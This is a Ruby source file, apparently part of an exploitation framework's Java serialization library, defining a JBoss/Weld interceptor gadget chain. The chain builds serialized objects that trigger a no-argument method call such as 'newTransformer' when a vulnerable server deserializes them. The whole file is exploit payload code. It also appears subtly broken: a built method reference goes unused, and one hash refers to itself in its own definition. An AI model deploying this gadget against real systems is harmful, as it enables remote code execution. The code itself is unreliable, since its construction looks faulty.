# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class JBoss
          def make_invoke_noarg(obj, cls, _method, weld: false)
            pkg = if weld
                    'org/jboss/weld/interceptor/'
                  else
                    'org/jboss/interceptor/'
                  end
            p = 'L' + pkg

            tclass = Model::JavaClass.new('Ljava/util/HashMap;')
            tgt = Model::JavaObject.new('Ljava/util/HashMap;', {})
            itype = Model::JavaEnum.new(p + 'spi/model/InterceptionType;', 'POST_ACTIVATE')


            interceptr = Model::JavaObject.new(p + 'reader/ClassMetadataInterceptorReference;',
                                                         'classMetadata' => Model::JavaObject.new(p + 'reader/ReflectiveClassMetadata;','clazz' => tclass))

            methodr = Model::JavaObject.new(p + 'builder/MethodReference;',
                                            'methodName' => 'newTransformer',
                                            'parameterTypes' => Java::Serialize::JavaArray.new('Ljava/lang/Class;', []),
                                            'declaringClass' => Java::Serialize::JavaClass.new(cls))

            imm = Model::JavaObject.new('Ljava/util/HashMap;', 
                                        'elements' => {
              itype => Model::JavaObject.new('Ljava/util/ArrayList;', 'elements' => [
                Model::JavaObject.new(p + 'reader/DefaultMethodMetadata$DefaultMethodMetadataSerializationProxy;',
                                      'methodReference' => imm)
              ])
            })

            interceptmeta = Model::JavaObject.new(p + 'reader/SimpleInterceptorMetadata;', 
                                                  'interceptorReference' => interceptr,
                                                  'interceptorMethodMap' => imm)

            model = Model::JavaObject.new(p + 'builder/InterceptionModelImpl;', 
                                          'globalInterceptors' => Model::JavaObject.new('Ljava/util/HashMap;', 'elements' => {
              itype => Model::JavaObject.new('Ljava/util/ArrayList;', 'elements' => [interceptmeta])
            }),
            'interceptedEntity' => tclass)

            Model::JavaObject.new(p + 'proxy/InterceptorMethodHandler;', 
                                  'interceptionModel' => model,
                                  'interceptorHandlerInstances' => Model::JavaObject.new('Ljava/util/HashMap;', 'elements' => { interceptmeta => obj }),
                                  'targetInstance' => tgt,
                                  'invocationContextFactory' => Model::JavaObject.new(p + 'proxy/DefaultInvocationContextFactory;', {}))
          end
        end
      end
    end
  end
end
